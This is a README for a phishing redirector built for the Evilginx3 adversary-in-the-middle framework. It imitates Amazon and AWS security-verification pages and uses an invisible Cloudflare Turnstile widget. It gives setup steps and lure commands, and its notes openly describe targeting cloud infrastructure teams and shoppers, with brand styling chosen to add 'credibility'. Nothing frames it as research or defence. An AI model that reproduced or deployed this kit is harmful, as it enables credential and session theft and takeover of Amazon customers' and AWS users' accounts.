# Amazon/AWS Turnstile Redirector

## Overview

Dual-purpose security verification page for both Amazon shopping and AWS console access with Cloudflare Turnstile.

## Setup Instructions

### 1. Create Cloudflare Turnstile Site

1. Visit https://dash.cloudflare.com/?to=/:account/turnstile
2. Create site with **Invisible** widget mode
3. Copy the Site Key

### 2. Configure Redirector

Edit `index.html` line 163:
```javascript
const TURNSTILE_SITEKEY = 'YOUR_SITE_KEY';
```

### 3. Evilginx3 Setup

```
lures create amazon
lures edit 0 redirector amazon_turnstile
lures edit 0 path /ap/verify
lures get-url 0
```

## Features

- Amazon orange branding (#FF9900)
- Official Amazon logo (with smile arrow)
- Dual messaging for Amazon shopping + AWS
- AWS-specific notice for cloud users
- Professional, trusted design
- Mobile responsive

## Notes

This redirector works with the dual-purpose Amazon phishlet that handles both:
- Amazon.com shopping accounts
- AWS Console access (console.aws.amazon.com)

The AWS notice adds credibility when targeting cloud infrastructure teams while still being relevant for regular Amazon shoppers.

## Customization

Remove or modify the `.aws-notice` section if targeting only shopping accounts. The orange accent color (#FF9900) is Amazon's signature brand color.

